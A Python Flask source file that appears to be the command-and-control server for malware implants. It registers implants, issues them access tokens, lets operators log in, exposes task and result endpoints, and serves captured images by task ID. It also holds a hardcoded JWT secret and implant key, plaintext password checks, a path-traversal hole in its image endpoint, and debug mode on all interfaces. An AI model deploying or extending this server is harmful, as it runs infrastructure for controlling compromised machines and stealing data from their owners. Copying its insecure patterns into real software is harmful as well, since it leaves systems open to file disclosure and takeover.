
import os
import resources

from flask import Flask, request, Response, jsonify, send_file
from flask_restful import Api
from database.db import initialize_db
from flask_jwt_extended import JWTManager, create_access_token
from database.models import Implant, Profile

app = Flask(__name__)
app.config['JWT_SECRET_KEY'] = 'super-secret-pass-5522-flag'
app.config['MONGODB_SETTINGS'] = {
    'db': 'C2Server',
    'host': 'mongodb://192.168.0.115:27017/C2Server'
}

initialize_db(app)

api = Api(app)
jwt = JWTManager(app)

secretkey = "e7bcc0ba5fb1dc9cc09460baaa2a6986"

@app.route('/config', methods=['POST'])
def register():
    try:
        implantID = request.json.get('implant_id', None)

        if not implantID :
            return jsonify({"msg": "bay"}), 400
        body = request.get_json()
        findimp = Implant.objects(implant_id=str(implantID)).first()
        if findimp:
            return jsonify({"msg": "welcome again"}), 200
        imp = Implant(**body)
        imp.save()
        return jsonify({"msg": "Implant Registered"}), 200
    except Exception as e:
        return jsonify({"msg": "bay"}), 500

@app.route('/login', methods=['POST'])
def login():
    try:
        implantID = request.json.get('implantID', None)
        secret = request.json.get('secret', None)
        if not implantID or not secret:
            return jsonify({"msg": "bay"}), 400

        imp = Implant.objects(implant_id=str(implantID)).first()
        print(imp.to_json())
        if imp and secret == secretkey:
            access_token = create_access_token(identity=implantID, expires_delta=False)
            return jsonify(access_token=access_token), 200
        else:
            return jsonify({"msg": "Invalid Token"}), 401
    except Exception as e:
        return jsonify({"msg": "bay"}), 500

@app.route('/profile/login', methods=['POST'])
def profile_login():
    try:
        username = request.json.get('username', None)
        password = request.json.get('password', None)
        if not username or not password:
            return jsonify({"msg": "bay"}), 400

        user = Profile.objects(username=str(username)).first()
        
        if user and password == user.password:
            
            access_token = create_access_token(identity=username, expires_delta=False)
            return jsonify(access_token=access_token), 200
        else:
            return jsonify({"msg": "Invalid pass"}), 401
    except Exception as e:
        print(e)
        return jsonify({"msg": "bay"}), 500
    
@app.route('/get_image', methods=['GET'])
def get_image():

    path_to_file = "images/"+request.args.get('task_id')+".png"

    if not path_to_file or not os.path.isfile(path_to_file):
         return jsonify({"msg": "Invalid path"}), 401
    
    return send_file(path_to_file, mimetype='images/png')

api.add_resource(resources.Tasks, '/tasks', endpoint='tasks')
api.add_resource(resources.Results, '/results', endpoint='results')
api.add_resource(resources.implants, '/implants', endpoint='implants')
if __name__ == '__main__':
    app.run(port=5000,debug=True,host='0.0.0.0')